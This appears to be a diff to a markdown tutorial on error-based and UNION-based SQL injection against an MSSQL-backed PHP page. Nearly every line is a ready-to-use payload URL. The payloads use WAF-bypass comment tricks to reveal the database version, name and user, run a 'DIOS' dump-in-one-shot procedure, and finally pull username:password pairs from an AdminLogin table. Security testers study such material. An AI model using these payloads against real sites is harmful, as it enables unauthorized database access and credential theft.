@@ -239,7 +239,7 @@ Both payloads will return the same error, with the database name output.
 ## Dumping database (UNION based query)
 
 Use the union query which worked, in this case I bypassed WAF and found that the 3rd column is vulnerable with payload:  
-```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -```  
+```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -```  
 
 Becasue of the 3rd column, replace number **3** with the following payloads to retrieve informations:
 
@@ -251,15 +251,15 @@ user_name()
 
 Example:  
 Retrieve database version:  
-```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,@@version,4-- -```  
+```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,@@version,4-- -```  
 Look at the error message, the version will be displayed there.  
 
 Retrieve database name:  
-```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,db_name(),4-- -```  
+```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,db_name(),4-- -```  
 Look at the error message, the database name will be displayed there.  
 
 Retrieve username of database:  
-```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,user_name(),4-- -```  
+```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,user_name(),4-- -```  
 Look at the error message, the database username will be displayed there.  
 
 ## Dumping database with DIOS
@@ -277,10 +277,10 @@ DIOS (dump in one shot), is a long crafted payload which will dump database(), t
 #### How to use DIOS?
 
 - This is a special case where DIOS store the payload into an environment variable. We will use the UNION based payload which we found the vulnerable column, this case we used:  
-```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -```  
+```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -```  
 
 - Delete every number and **-- -** from the payload, so the payload will look like:  
-```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/```  
+```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/```  
 
 - Right in the end of the payload add the DIOS payload:  
 
@@ -290,11 +290,26 @@ http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ ;b
 - No output will be displayed because it is stored into an environment variable. We can access it by using one of the 2 following payload:  
   
   Union based query:  
-  ```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,output,4-- -```  
+  ```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,output,4-- -```  
 
   Boolean based query:  
-  ```http://domain.com/index.php?id=1 and 1=cast(select output from Kleiton0x00)-- -```  
+  ```http://domain.com/index.php?id=1' and 1=cast(select output from Kleiton0x00)-- -```  
 
 *NOTE: Replace the vulnerable column number (this case it was **3**). The number is found with UNION based payloads we did on the previous step.*  
 
 - Look at the error message/website, the retrieved informations are shown.
+
+![dios_dumped_db](https://i.imgur.com/OmWEciR.jpg)  
+
+### Dumping data inside columns
+
+We know what the tables and columns are (from DIOS or manual dumping), however DIOS is much more recommended as it saves time and effort.
+
+This is a piece of the whole database that we will dump:
+
+**Table name**: *AdminLogin*  
+**Columns**: *username*, *password* 
+
+```http://domain.com/index.php?id=1' and 1=(select username %2b ':' %2b password from AdminLogin for xml PATH("))-- -```
+
+![column_dumped](https://i.imgur.com/OwfunVg.jpg)
